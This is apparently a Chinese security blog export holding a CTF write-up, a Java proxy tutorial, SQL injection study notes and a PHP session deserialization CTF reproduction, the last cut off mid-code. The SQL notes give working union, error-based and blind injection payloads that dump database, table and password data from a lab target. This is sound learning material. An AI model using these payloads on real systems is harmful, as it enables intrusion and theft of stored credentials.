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</code></pre><ul>
<li>解码发现存在<code>Salted</code>的头，应该就是openssl加密的或者AES加密的。密码应该就是apache</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090747@2x.png" alt="WX20201009-090747@2x"></p>
<ul>
<li>得到结果是0101，长度是4900，开平方正好是70×70,应该是一个二维码。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-092252@2x.png" alt="WX20201009-092252@2x"></p>
<ul>
<li>写个小脚本生成一下</li>
</ul>
<pre><code class="python">from PIL import Image
img = Image.new(&#39;RGB&#39;,(70,70),(0,0,0))
table = [[0]*70]*70
flag=0
f = open(&#39;misc1.txt&#39;,&#39;r&#39;)
string=&quot;&quot;
flag2=0
for i in f:
    string=string+i
for i in table:
    flag2=flag2+1
    for j in range(0,70):
        if string[flag]==&#39;1&#39;:
            img.putpixel((int(flag2)-1,int(j)),(255,255,255))
        flag=flag+1


img.show()
f.close()
</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/tmpx4rn2w9s.png" alt="tmpx4rn2w9s"></p>
]]></content>
      <categories>
        <category>全国大学生信息安全竞赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA代理学习</title>
    <url>//articles/1d5b525ad1bdf.html</url>
    <content><![CDATA[<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><pre><code class="java">[可见度] interface 接口名称 [extends 其他的接口名] {
        // 声明变量
        // 抽象方法
}

//接口类的实现
...implements 接口名称[, 其他接口名称, 其他接口名称..., ...] ...
</code></pre>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><pre><code class="JAVA">package com.xxxx.helloworld;
//import java.lang.*;

//调用接口
public class Hello {
    public static void main(String[] args) {
        Helloimplements m = new Helloimplements();
        m.sayHello(&quot;aaa&quot;);
    }
}

//定义接口
interface IHello {

    void sayHello(String name);

    void sayGoogBye(String name);

}
//定义类
class Helloimplements implements IHello {
    @Override
    public void sayHello(String name) {
        System.out.println(&quot;Hello &quot; + name);
    }
    @Override
    public void sayGoogBye(String name) {
        System.out.println(name+&quot; GoodBye!&quot;);
    }
}</code></pre>
<h2 id="实际用途引入"><a href="#实际用途引入" class="headerlink" title="实际用途引入"></a>实际用途引入</h2><ul>
<li>假设我们需要在每次问候他人的时候做一个日志记录，这时候我们只需要在<code>Helloimplements</code>加一个写日志的方法即可，但是如果这个<code>Helloimplements</code>是在封装好的JAR里面呢，我们没法修改代码呢？</li>
</ul>
<h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><ul>
<li>为了实现上述需求我们可以使用静态代理，创建一个新的类作为代理类，具体实现如下,虽然有点像继承，但是本质上还是有所区别，代理的是接口而非类。也就是将一个接口实例化成对象后传入代理类中，代理类相对应的（名称一致）的方法上进行调用对应方法，然后添加我们想增加的功能。这就是所谓的静态代理。</li>
</ul>
<pre><code class="java">package com.xxxx.helloworld;
//import java.lang.*;


public class Hello {
    public static void main(String[] args) {
        Helloimplements m = new Helloimplements();
        StaicProxy proxy = new StaicProxy();
        proxy.setImpl(m);
        proxy.sayHello(&quot;黄莉荃&quot;);
    }
}


interface IHello {

    void sayHello(String name);

    void sayGoodBye(String name);

}

class Helloimplements implements IHello {
    @Override
    public void sayHello(String name) {
        System.out.println(&quot;Hello &quot; + name);
    }
    @Override
    public void sayGoodBye(String name) {
        System.out.println(name+&quot; GoodBye!&quot;);
    }
}

class StaicProxy implements IHello{
    private IHello iHello;
    public  void setImpl(IHello impl){
        this.iHello=impl;
    }
    @Override
    public void sayHello(String name) {
        System.out.println(&quot;logs:SayHello&quot;);
        iHello.sayHello(name);
    }

    @Override
    public void sayGoodBye(String name) {
        System.out.println(&quot;logs:SayGoodBye&quot;);
        iHello.sayHello(name);
    }
}</code></pre>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><ul>
<li>动态代理（dynamic proxy）同样需要一个代理类来代理接口，其中比较关键的是<code>newProxyInstance</code>这个方法来实现代理：</li>
</ul>
<h5 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h5><pre><code class="java">public static Object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)
       throws IllegalArgumentException</code></pre>
<ul>
<li>参数：</li>
</ul>
<blockquote>
<p>loader: 用哪个类加载器去加载代理对象</p>
<p>interfaces:动态代理类需要实现的接口</p>
<p>h:动态代理方法在执行时，会调用h里面的invoke方法去执行</p>
</blockquote>
<ul>
<li><p>实例：</p>
<ul>
<li>在代理类中使用一个bind方法来调用<code>newProxyInstance</code>,因为传入的是接口实例化后的对象，所以形参也是<code>Object</code>类型，然后我们将<code>newProxyInstance</code>返回的对象return.</li>
</ul>
<pre><code class="java">   public Object bind(Object delegate){
        this.delegate = delegate;
        return  Proxy.newProxyInstance(
          this.delegate.getClass().getClassLoader(),this.delegate.getClass().getInterfaces(),this);
    }</code></pre>
</li>
</ul>
<h5 id="InvocationHandler"><a href="#InvocationHandler" class="headerlink" title="InvocationHandler"></a>InvocationHandler</h5><ul>
<li>和前面静态代理一样我们需要定义一个代理类，这个类需要<code>implements</code>InvocationHandler,我们在使用<code>newProxyInstance</code>返回的对象调用相应的方法时候，<code>InvocationHandler</code>会自动调用<code>invoke</code>方法。所以在代理类里面需要定义一个<code>invoke</code>方法。</li>
</ul>
<h6 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h6><pre><code class="java">public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println(&quot;记录日志&quot;);
        Object result = method.invoke(vehical, args);
        return result;
    }</code></pre>
<ul>
<li>参数</li>
</ul>
<blockquote>
<p>proxy：就是代理对象，newProxyInstance方法的返回对象</p>
<p>method：调用的方法</p>
<p>args: 方法中的参数</p>
</blockquote>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><pre><code class="java">package com.xxxx.helloworld;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;



public class Hello {
    public static void main(String[] args) {
        Helloimplements m = new Helloimplements();
        DynaProxy proxy = new DynaProxy();
        IHello ihello = (IHello) proxy.bind(m);
        ihello.sayHello(&quot;黄莉荃&quot;);
    }
}


interface IHello {
    void sayHello(String name);
    void sayGoodBye(String name);
}

class Helloimplements implements IHello {
    @Override
    public void sayHello(String name) {
        System.out.println(&quot;Hello &quot; + name);
    }
    @Override
    public void sayGoodBye(String name) {
        System.out.println(name+&quot; GoodBye!&quot;);
    }
}
class DynaProxy implements InvocationHandler{
    private Object delegate;
    public Object bind(Object delegate){
        this.delegate = delegate;
        return  Proxy.newProxyInstance(
          this.delegate.getClass().getClassLoader(),this.delegate.getClass().getInterfaces(),this);
    }
    public Object invoke(Object proxy,Method method,Object[] args ) throws  Throwable{
        Object result =null;
        try{
            String originalName = method.getName();
            if(originalName.equals(&quot;sayHello&quot;)){
                System.out.println(&quot;logs:sayHello&quot;);
            }else if(originalName.equals(&quot;sayGoodbye&quot;)){
                System.out.println(&quot;logs:sayGoodbye&quot;);
            }

            result = method.invoke(this.delegate,args);
        }
        catch (Exception e){
            e.printStackTrace();
        }
        return result;
    }

}
</code></pre>
<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><ul>
<li>我们在bind处进行断点，可以看到<code>Helloimplements</code>对象传入。并赋值给<code>delegate</code></li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-133749@2x.png" alt="WX20201114-133749@2x"></p>
<ul>
<li>跳到下一步可以看到调用了<code>Proxy.newProxyInstance</code>.</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-143013@2x.png" alt="WX20201114-143013@2x"></p>
<ul>
<li>我们断点在<code>ihello.sayHello(&quot;黄莉荃&quot;);</code>可以看到虽然<code>ihello</code>的静态类型是<code>IHello</code>但是实际的数据类型是<code>$Proxy0</code>.说明这个变量是被JVM加工过的。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-144902@2x.png" alt="WX20201114-144902@2x"></p>
<ul>
<li>当这个被JVM加工过的变量的<code>sayHello</code>或者<code>sayGoodbye</code>方法被调用时候，将由JVM自动转交到<code>invoke</code>下去。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-145321@2x.png" alt="WX20201114-145321@2x"></p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入学习笔记</title>
    <url>//articles/21ffb483b.html</url>
    <content><![CDATA[<ul>
<li>时间：2019年8月6日21:39:22</li>
<li>地点：福州大学</li>
</ul>
<h3 id="单引号字符型注入"><a href="#单引号字符型注入" class="headerlink" title="单引号字符型注入"></a>单引号字符型注入</h3><h4 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h4><p>​     and 1=2 时候任然返回正常，但是” ’ “时会报错</p>
<ul>
<li><strong>sql语句</strong>：</li>
</ul>
<pre><code class="mysql">&#39;order by 1,2,3--+</code></pre>
<ul>
<li><p><strong>语义</strong>：查询表中有几个字段，如果字段超过实际个数将会报错</p>
</li>
<li><p><strong>eg</strong>:</p>
</li>
</ul>
<pre><code class="html">http://www.sql.com/Less-1/?id=1%27%20order%20by%201,2,3%20--+</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649678592883.png" alt="1564883718907"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649679094636.png" alt="1564884099855"></p>
<h4 id="检测回显位"><a href="#检测回显位" class="headerlink" title="检测回显位"></a>检测回显位</h4><ul>
<li><strong>sql语句：</strong></li>
</ul>
<pre><code class="mysql">union select 1,2,3--+                    </code></pre>
<ul>
<li><p><strong>语义：</strong>查询存在的表段中的显位。使用时候将id改成不存在的id值然后查询。如果返回位有显示，则在该返回位可以进行查询</p>
</li>
<li><p><strong>eg:</strong></p>
</li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,2,3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649682028375.png" alt="1564884653714"></p>
<h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><ul>
<li><strong>sql语句：</strong>                    </li>
</ul>
<pre><code class="mysql">select group_concat(schema_name)from information_schema.schemata#注意：group_concat()是将返回的数据当做一行输出</code></pre>
<ul>
<li><strong>语义：</strong>查询information_schema数据库中的shcemata中的schema_name表段的内容，该数据库的该表段储存了Mysql所有数据库的名字（Mysql5.5+）</li>
<li><strong>eg:</strong></li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649682417938.png" alt="1564885490338"></p>
<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><ul>
<li><strong>sql语句:</strong></li>
</ul>
<pre><code class="mysql">select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></pre>
<ul>
<li><strong>语义：</strong>查询information_schema数据库中的tables表中的table_name内容条件为table_schema（保存数据库名字）为security,该语句将会爆出该数据库的所有表名</li>
<li><strong>eg:</strong></li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649683003970.png" alt="1564885936768"></p>
<h4 id="爆表段"><a href="#爆表段" class="headerlink" title="爆表段"></a>爆表段</h4><ul>
<li><strong>sql语句：</strong></li>
</ul>
<pre><code class="mysql">select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;</code></pre>
<ul>
<li><strong>语义:</strong>  该语句查询information_schema数据库中的columns表中column_name表段的值，条件table_name=’users‘,该语句可以查询出改表的所有表段</li>
<li><strong>eg:</strong></li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649683779377.png" alt="1564886738794"></p>
<h4 id="爆表段值"><a href="#爆表段值" class="headerlink" title="爆表段值"></a>爆表段值</h4><ul>
<li><strong>sql语句:</strong></li>
</ul>
<pre><code class="mysql">select group_concat(password) from security.user</code></pre>
<ul>
<li><strong>语义:</strong>查询security数据库中的user表中的password表段的所有值，查询用户名类似。</li>
<li><strong>eg:</strong></li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(password)%20from%20security.users),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/1564968443135.png" alt="1564887127624"></p>
<p>(完)</p>
<h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><p><strong>标志：</strong>使用and1=1 和and 1=2时候出现页面变化说明是数值型注入。具体流程与上面一样，但是无需使用（’）作为闭合。</p>
<h3 id="单引号括型字符型注入"><a href="#单引号括型字符型注入" class="headerlink" title="单引号括型字符型注入"></a>单引号括型字符型注入</h3><ul>
<li><strong>标志：</strong> 使用and 1= 1和and 1=2 返回无差异说明是字符型注入，使用单引号闭合再使用order by 爆出语法错误，使用  ‘) 闭合可以正常注入。</li>
</ul>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>若存在注入，但是并没有显位，但是页面存在报错代码，那么可以通过报错作为显位。</p>
<ul>
<li><strong>报错注入的三种方式：</strong></li>
</ul>
<ol>
<li><p>通过floor报错</p>
<pre><code class="mysql">and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
<p> 输出字符长度限制为64个字符</p>
<p> 输出字符长度限制为64个字符</p>
</li>
<li><p>通过updatexml报错</p>
<pre><code class="mysql">and updatexml(1,payload,1)</code></pre>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
</li>
<li><p>通过ExtractValue报错</p>
<pre><code class="mysql">and extractvalue(1, payload)</code></pre>
<p>输出字符有长度限制，最长32位。</p>
<p>输出字符有长度限制，最长32位。</p>
</li>
</ol>
<p>例子：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190806/1565058715692.png" alt></p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><pre><code class="mysql">#布尔盲注可能用到的函数
ascii()#括号中的参数转化成相应的ascii码
ORD()与ascii()#用法类似
substr()substr(a,b,c)#从b 位置开始，截取字符串a 的c 长度。
mid()用法与substr（）#类似
length()#返回str字符串的长度
left(database(),1) #取database字符串的左边第一个</code></pre>
<p>例子</p>
<pre><code class="mysql">&#39; and mid(version(),2,1)=&#39;.&#39; --+</code></pre>
<p>语义:mid用于截断版本号的第二位是不是等于“.”如果是则放回TURE否则FALSE</p>
<pre><code class="mysql">#爆出数据库版本：
and mid(version(),1,1)=1
#爆出数据库用户：
and ascii(mid(user(),1,1))&gt;18
#爆出表名：
and ascii(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;18</code></pre>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><pre><code class="mysql">if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep</code></pre>
<h4 id="SQL注入高级用法（读写文件）"><a href="#SQL注入高级用法（读写文件）" class="headerlink" title="SQL注入高级用法（读写文件）"></a><strong>SQL注入高级用法（读写文件）</strong></h4><p>(后续补入)</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-SESSION反序列化——复现巅峰极客一道WEB题</title>
    <url>//articles/2221785a2.html</url>
    <content><![CDATA[<h1 id="一个例子引入"><a href="#一个例子引入" class="headerlink" title="一个例子引入"></a>一个例子引入</h1><ul>
<li><p><strong><em>session.php</em></strong></p>
<pre><code class="php">&lt;?php
error_reporting(0);
ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
session_start();
$_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
?&gt;</code></pre>
</li>
<li><p><strong><em>payload.php</em></strong></p>
<pre><code class="php">&lt;?php
class XianZhi{
    public $name;
    function __wakeup(){
      echo &quot;Who are you?&quot;;
    }
    function __destruct(){
      echo &#39;&lt;br&gt;&#39;.$this-&gt;name;
    }
}
    $str = new XianZhi();
    $str-&gt;name = &quot;xianzhi&quot;;
    echo serialize($str);
  ?&gt;</code></pre>
</li>
<li><p><strong><em>class.php</em></strong></p>
<pre><code class="php">&lt;?php
    error_reporting(0);
  ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
  session_start();
    class XianZhi{
    public $name = &#39;panda&#39;;
    function __wakeup(){
      echo &quot;Who are you?&quot;;
    }
    function __destruct(){
      echo &#39;&lt;br&gt;&#39;.$this-&gt;name;
    }
  }
  $str = new XianZhi();
 ?&gt;</code></pre>
</li>
<li><p>payload.php中获取序列化的payload,然后再访问<code>session.php</code>文件传入<code>|</code>+<code>序列化</code>格式的值，然后再次访问<code>class.php</code>文件的时候 会发现页面会多了个”xianzhi”这说明我们传入的值被反序列化了。</p>
</li>
</ul>
<h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><ul>
<li><p>我们看巅峰极客这道题,可以很明显这里使用了一个<code>file_put_contents</code>将内容写到了一个指定地址的地方，那么我们该如何利用呢，那么这里就可以使用session反序列化将我们传入的序列化内容，从而控制Cache类，将类属性改成我们想要的内容，从而达到RCE的效果。问题又来了那么怎么才能控制SESSION呢，这里可以用到 <code>PHP BUG #71101</code> ，也就是常用的SESSION文件包含（上传进度文件）RCE的漏洞，将SESSION传入并导致反序列化。</p>
<pre><code class="php">&lt;?php
class Cache{
    public $data;
    public $sj;
    public $path;
    public $html;
    function __construct($data){
        $this-&gt;data[&#39;name&#39;]=isset($data[&#39;post&#39;][&#39;name&#39;])?$data[&#39;post&#39;][&#39;name&#39;]:&#39;&#39;;
        $this-&gt;data[&#39;message&#39;]=isset($data[&#39;post&#39;][&#39;message&#39;])?$data[&#39;post&#39;][&#39;message&#39;]:&#39;&#39;;
        $this-&gt;data[&#39;image&#39;]=!empty($data[&#39;image&#39;])?$data[&#39;image&#39;]:&#39;/static/images/pic04.jpg&#39;;
        $this-&gt;path=Cache_DIR.DS.session_id().&#39;.php&#39;;
    }

    function __destruct(){
        $this-&gt;html=sprintf(&#39;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; /&gt;&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/noscript.css&quot; /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class=&quot;is-preload&quot;&gt;&lt;div id=&quot;wrapper&quot;&gt;&lt;header id=&quot;header&quot;&gt; &lt;div class=&quot;logo&quot;&gt;&lt;span class=&quot;icon fa-diamond&quot;&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class=&quot;content&quot;&gt;&lt;div class=&quot;inner&quot;&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a 